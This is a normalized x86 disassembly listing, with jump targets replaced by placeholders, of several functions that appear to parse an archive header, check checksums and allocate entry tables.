movzx edx [ ecx + eax * 2 + 0x1 ]
test edx edx
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0xc ]
jb r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
sub_4049a0
push ebp
mov ebp esp
sub esp 0xc4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x44 ] 0x0
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_403190
add esp 0x8
mov [ ebp - 0x68 ] eax
cmp [ ebp - 0x68 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x4
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
or eax [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_403250
add esp 0x4
mov [ ebp - 0x94 ] eax
cmp [ ebp - 0x94 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x5
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x2c ]
push edx
mov eax [ ebp + 0x28 ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
add eax 0x28
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_404700
add esp 0x24
mov [ ebp - 0xa4 ] eax
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_403190
add esp 0x8
mov [ ebp - 0x9c ] eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
mov eax [ ebp - 0x94 ]
jmp r-xdata
mov eax 0x10
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x28 ]
add ecx [ eax + 0x20 ]
mov edx [ edx + 0x2c ]
adc edx [ eax + 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x28 ] ecx
mov [ eax + 0x2c ] edx
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_403190
add esp 0x8
mov [ ebp - 0xac ] eax
cmp [ ebp - 0xac ] 0x0
je r-xdata
mov eax [ ebp - 0xa4 ]
jmp r-xdata
mov eax [ ebp - 0x9c ]
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_403110
add esp 0x8
mov [ ebp - 0xb0 ] eax
cmp [ ebp - 0xb0 ] 0x0
je r-xdata
mov eax [ ebp - 0xac ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x1c ] ecx
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0xb0 ]
jmp r-xdata
mov edx [ ebp - 0x24 ]
shl edx 0x5
push edx
mov eax [ ebp + 0x28 ]
push eax
mov ecx [ ebp + 0x28 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x10 ] ecx
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x24 ]
jae r-xdata
lea edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_403190
add esp 0x8
mov [ ebp - 0x60 ] eax
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov ecx [ ebp - 0x28 ]
shl ecx 0x5
add ecx [ ebp - 0x34 ]
push ecx
call sub_402910
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x1c ]
or ecx [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x60 ]
jmp r-xdata
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
lea edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_403000
add esp 0x8
mov [ ebp - 0x90 ] eax
cmp [ ebp - 0x90 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
xor eax eax
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] eax
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0xb8 ]
jb r-xdata
mov eax [ ebp - 0x90 ]
jmp r-xdata
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1c ]
cdq
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xc0 ] edx
mov eax [ ebp - 0xc4 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
ja r-xdata
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_4031b0
add esp 0xc
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc0 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov eax 0x10
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0xbc ]
jbe r-xdata
mov edx [ ebp + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_402b80
add esp 0x8
mov eax [ ebp - 0x28 ]
shl eax 0x5
add eax [ ebp - 0x34 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x2c ]
mov [ ecx + 0x1a ] 0x0
mov edx [ ebp + 0x1c ]
cmp [ edx ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x54 ]
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x48 ] edx
mov eax [ ebp - 0x48 ]
sub eax 0xe
mov [ ebp - 0x48 ] eax
cmp [ ebp - 0x48 ] 0x7
ja r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov eax [ ebp - 0x28 ]
movzx ecx [ edx + eax ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax + 0x18 ] 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_4031b0
add esp 0xc
mov [ ebp - 0x7c ] eax
cmp [ ebp - 0x7c ] 0x0
je r-xdata
mov ecx [ ebp - 0x48 ]
jmp [ ecx * 4 + jump_table_405214 ]
mov [ ebp - 0x84 ] 0x1
mov [ ebp - 0x84 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x2c ]
movzx edx [ ecx + 0x18 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x7c ]
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_403810
add esp 0x4
mov [ ebp - 0xa8 ] eax
cmp [ ebp - 0xa8 ] 0x0
je r-xdata
mov ecx [ ebp + 0x2c ]
push ecx
mov edx [ ebp + 0x1c ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_403330
add esp 0x10
mov [ ebp - 0xb4 ] eax
cmp [ ebp - 0xb4 ] 0x0
je r-xdata
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp + 0x20 ]
push ecx
mov edx [ ebp - 0x44 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_403330
add esp 0x10
mov [ ebp - 0x80 ] eax
cmp [ ebp - 0x80 ] 0x0
je r-xdata
mov ecx [ ebp + 0x2c ]
push ecx
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_403410
add esp 0x10
mov [ ebp - 0xa0 ] eax
cmp [ ebp - 0xa0 ] 0x0
je r-xdata
mov ecx [ ebp + 0x2c ]
push ecx
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_403410
add esp 0x10
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx [ ebp + 0x20 ]
cmp [ edx ] 0x0
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax + 0x19 ] 0x0
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x38 ]
mov esi [ edx + ecx * 8 ]
mov [ eax + 0x8 ] esi
mov edx [ edx + ecx * 8 + 0x4 ]
mov [ eax + 0xc ] edx
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x38 ]
mov ecx [ ecx + eax * 4 ]
mov [ edx + 0x10 ] ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x38 ]
mov al [ eax + edx ]
mov [ ecx + 0x1b ] al
mov ecx [ ebp - 0x38 ]
add ecx 0x1
mov [ ebp - 0x38 ] ecx
jmp r-xdata
mov edx [ ebp - 0x2c ]
mov al [ ebp - 0x84 ]
mov [ edx + 0x18 ] al
mov eax [ ebp - 0x14 ]
sub eax 0x1
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x40 ]
and ecx 0x1
je r-xdata
mov eax [ ebp - 0xa8 ]
jmp r-xdata
mov [ ebp - 0x44 ] 0x0
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xb4 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x80 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_403810
add esp 0x4
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0xa0 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_403810
add esp 0x4
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov eax [ ebp - 0x5c ]
jmp r-xdata
mov ecx [ ebp + 0x20 ]
mov edx [ ecx ]
mov eax [ ebp - 0x4c ]
movzx ecx [ edx + eax ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax + 0x19 ] 0x1
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x28 ]
push edx
mov eax [ ebp - 0x40 ]
push eax
mov ecx [ ebp + 0x8 ]
add ecx 0x44
push ecx
call sub_401070
add esp 0xc
test eax eax
jne r-xdata
mov eax 0x10
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x24 ]
jae r-xdata
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x88 ]
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x64 ]
jmp r-xdata
mov [ ebp - 0x8c ] 0x1
mov [ ebp - 0x8c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4c ]
add ecx 0x1
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x2c ]
mov [ edx + 0x8 ] 0x0
mov [ edx + 0xc ] 0x0
mov eax [ ebp - 0x2c ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x2c ]
mov [ ecx + 0x1b ] 0x0
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x24 ]
add edx 0x1
jne r-xdata
mov eax 0x2
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov eax [ ebp - 0x28 ]
movzx ecx [ edx + eax ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x24 ]
jae r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
mov al [ ebp - 0x8c ]
mov [ edx + 0x19 ] al
mov ecx [ ebp - 0x24 ]
lea edx [ ecx * 4 + 0x4 ]
push edx
mov eax [ ebp + 0x28 ]
push eax
mov ecx [ ebp + 0x28 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x70 ]
mov [ eax + 0x40 ] ecx
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x44 ]
add edx 0x1
mov [ ebp - 0x44 ] edx
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp + 0x2c ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x24 ]
mov [ eax ] 0x0
jmp r-xdata
mov edx [ ebp - 0x28 ]
shl edx 0x5
add edx [ ebp - 0x34 ]
mov [ ebp - 0x50 ] edx
mov eax [ ebp + 0x24 ]
mov ecx [ eax ]
mov edx [ ebp - 0x28 ]
mov al [ ecx + edx ]
mov [ ebp - 0x2e ] al
mov ecx [ ebp - 0x50 ]
mov dl [ ebp - 0x2e ]
mov [ ecx + 0x1d ] dl
mov eax [ ebp - 0x50 ]
mov [ eax + 0x14 ] 0x0
movzx ecx [ ebp - 0x2e ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp + 0x2c ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x24 ]
mov [ eax ] 0x0
jmp r-xdata
mov edx [ ebp - 0x28 ]
shl edx 0x5
add edx [ ebp - 0x34 ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp + 0x24 ]
mov ecx [ eax ]
mov edx [ ebp - 0x28 ]
mov al [ ecx + edx ]
mov [ ebp - 0x2d ] al
mov ecx [ ebp - 0x3c ]
mov dl [ ebp - 0x2d ]
mov [ ecx + 0x1c ] dl
mov eax [ ebp - 0x3c ]
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0x3c ]
mov [ ecx ] 0x0
movzx edx [ ebp - 0x2d ]
test edx edx
je r-xdata
mov edx [ ebp - 0x40 ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
push eax
call sub_412c10
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x40 ]
shr ecx 0x1
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push eax
call sub_4048f0
add esp 0x10
mov [ ebp - 0x98 ] eax
cmp [ ebp - 0x98 ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
jmp r-xdata
mov edx [ ebp - 0x50 ]
add edx 0x14
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_402f80
add esp 0x8
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x3c ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_402f80
add esp 0x8
mov [ ebp - 0x6c ] eax
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov ecx [ ebp - 0x40 ]
xor edx edx
push edx
push ecx
mov eax [ ebp + 0xc ]
push eax
call sub_4031b0
add esp 0xc
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x58 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x3c ]
add edx 0x4
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_402f80
add esp 0x8
mov [ ebp - 0x74 ] eax
cmp [ ebp - 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x6c ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x78 ]
jmp r-xdata
mov eax [ ebp - 0x74 ]
jmp r-xdata
sub_405240
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4049a0
add esp 0x28
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_405330
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp + 0x2c ]
push ecx
mov edx [ ebp + 0x28 ]
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x20 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x1c ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_404700
add esp 0x24
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
add eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x8 ]
adc ecx [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x1c ]
cmp [ edx + 0x18 ] 0x1
je r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
push edx
call sub_4028a0
add esp 0x4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_406590
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax 0x10
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
call sub_401070
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
push edx
mov eax [ ebp - 0x14 ]
push eax
call sub_4021e0
add esp 0x20
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp [ edx + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x28 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
call sub_401100
mov ecx [ ebp - 0x14 ]
cmp eax [ ecx + 0x20 ]
je r-xdata
mov eax 0x3
jmp r-xdata
sub_405480
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] 0x0
lea eax [ ebp - 0x24 ]
push eax
call sub_402940
add esp 0x4
mov ecx [ ebp + 0x1c ]
push ecx
lea edx [ ebp - 0x28 ]
push edx
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_405330
add esp 0x28
mov [ ebp - 0x34 ] eax
mov edx [ ebp + 0x1c ]
push edx
lea eax [ ebp - 0x24 ]
push eax
call sub_4029a0
add esp 0x8
mov ecx [ ebp - 0x30 ]
push ecx
mov edx [ ebp + 0x1c ]
push edx
mov eax [ ebp + 0x1c ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp - 0x2c ]
push edx
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x1c ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x1c ]
push ecx
mov edx [ ebp + 0x1c ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_405540
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xorpd xmm0 xmm0
movlpd [ ebp - 0x2c ] xmm0
push 0x1
lea eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0xc ]
call eax
add esp 0xc
mov [ ebp - 0x7c ] eax
cmp [ ebp - 0x7c ] 0x0
je r-xdata
push 0x11
push 0x20
lea ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_4065d0
add esp 0x10
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x70 ] 0x0
je r-xdata
mov eax [ ebp - 0x7c ]
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_402ea0
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov ecx 0x1
imul ecx ecx 0x6
movzx edx [ ebp + ecx - 0x24 ]
test edx edx
je r-xdata
mov eax 0x11
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x60 ] eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x5c ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x6c ] edx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x68 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xa8 ] ecx
mov edx [ ebp - 0x2c ]
add edx 0x20
mov eax [ ebp - 0x28 ]
adc eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] edx
mov [ ecx + 0x24 ] eax
lea ecx [ ebp - 0x18 ]
mov edx 0x14
call sub_401100
cmp eax [ ebp - 0x1c ]
je r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x6c ]
mov [ ebp - 0x64 ] edx
mov eax [ ebp - 0x64 ]
xor ecx ecx
mov [ ebp - 0xb0 ] eax
mov [ ebp - 0xac ] ecx
mov edx [ ebp - 0xb0 ]
cmp edx [ ebp - 0x6c ]
jne r-xdata
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0xac ]
cmp eax [ ebp - 0x68 ]
je r-xdata
cmp [ ebp - 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x60 ]
add ecx [ ebp - 0x6c ]
mov edx [ ebp - 0x5c ]
adc edx [ ebp - 0x68 ]
mov [ ebp - 0x84 ] ecx
mov [ ebp - 0x80 ] edx
mov eax [ ebp - 0x5c ]
cmp eax [ ebp - 0x80 ]
ja r-xdata
xor eax eax
jmp r-xdata
mov eax 0x11
jmp r-xdata
jb r-xdata
mov edx [ ebp - 0x60 ]
add edx [ ebp - 0x6c ]
mov eax [ ebp - 0x5c ]
adc eax [ ebp - 0x68 ]
add edx 0x20
adc eax 0x0
mov [ ebp - 0x9c ] edx
mov [ ebp - 0x98 ] eax
mov ecx [ ebp - 0x5c ]
cmp ecx [ ebp - 0x98 ]
jb r-xdata
mov ecx [ ebp - 0x60 ]
cmp ecx [ ebp - 0x84 ]
ja r-xdata
xorpd xmm0 xmm0
movlpd [ ebp - 0x34 ] xmm0
push 0x2
lea eax [ ebp - 0x34 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0xc ]
call eax
add esp 0xc
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
ja r-xdata
mov ecx [ ebp - 0x2c ]
add ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x28 ]
adc edx [ ebp - 0x5c ]
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x88 ] edx
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x88 ]
jb r-xdata
mov eax [ ebp - 0x78 ]
jmp r-xdata
mov edx [ ebp - 0x60 ]
cmp edx [ ebp - 0x9c ]
jbe r-xdata
mov eax 0x6
jmp r-xdata
ja r-xdata
mov edx [ ebp - 0x2c ]
add edx 0x20
mov eax [ ebp - 0x28 ]
adc eax 0x0
add edx [ ebp - 0x60 ]
adc eax [ ebp - 0x5c ]
mov [ ebp - 0x94 ] edx
mov [ ebp - 0x90 ] eax
mov ecx [ ebp - 0x30 ]
cmp ecx [ ebp - 0x90 ]
jb r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x8c ]
jb r-xdata
ja r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x20
mov ecx [ ebp - 0x28 ]
adc ecx 0x0
add eax [ ebp - 0x60 ]
adc ecx [ ebp - 0x5c ]
add eax [ ebp - 0x6c ]
adc ecx [ ebp - 0x68 ]
mov [ ebp - 0xa4 ] eax
mov [ ebp - 0xa0 ] ecx
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0xa0 ]
ja r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x94 ]
jb r-xdata
mov ecx [ ebp - 0x2c ]
add ecx 0x20
mov edx [ ebp - 0x28 ]
adc edx 0x0
add ecx [ ebp - 0x60 ]
adc edx [ ebp - 0x5c ]
push edx
push ecx
mov eax [ ebp + 0xc ]
push eax
call sub_406590
add esp 0xc
mov [ ebp - 0x74 ] eax
